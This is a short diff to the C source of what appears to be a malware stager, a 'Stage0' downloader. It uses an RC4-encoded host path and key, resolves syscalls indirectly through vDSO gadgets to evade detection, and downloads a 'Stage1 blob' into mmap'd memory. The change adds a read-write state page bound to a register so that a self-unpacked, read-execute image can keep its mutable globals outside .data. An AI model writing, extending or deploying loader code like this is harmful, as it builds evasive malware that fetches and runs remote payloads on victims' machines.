@@ -1,6 +1,7 @@
 #define _GNU_SOURCE
 #include "packer.h"
 #include "rc4.h"
+#include "state.h"
 #include "syscalls.h"
 #include "transport.h"
 #include "utils.h"
@@ -32,6 +33,11 @@ static const unsigned char encoded_path[] = {ENCODED_PATH};
 static const unsigned char encoded_key[] = {ENCODED_KEY};
 
 static void downloader_main(void) {
+  /* Allocate a dedicated RW state page and bind it to %r15. The stager image
+   * is mapped RX by the self-unpacker, so all mutable globals (syscall gadget
+   * cache, dl* cache) live in this mmap'd page instead of .data. */
+  stager_state_init();
+
   /* Resolve vDSO syscall gadget before any other syscalls */
   init_indirect_syscalls();
 
@@ -50,9 +56,9 @@ static void downloader_main(void) {
   debug_print("Stage0: Downloading Stage1 blob from %s:%s%s via %s\n", host,
               port, path, transport_name());
 
-  void *stage_blob = (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE,
-                                  PROT_READ | PROT_WRITE,
-                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  void *stage_blob =
+      (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE, PROT_READ | PROT_WRITE,
+                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (stage_blob == MAP_FAILED) {
     debug_print("Stage0: mmap failed\n");
     exit(1);
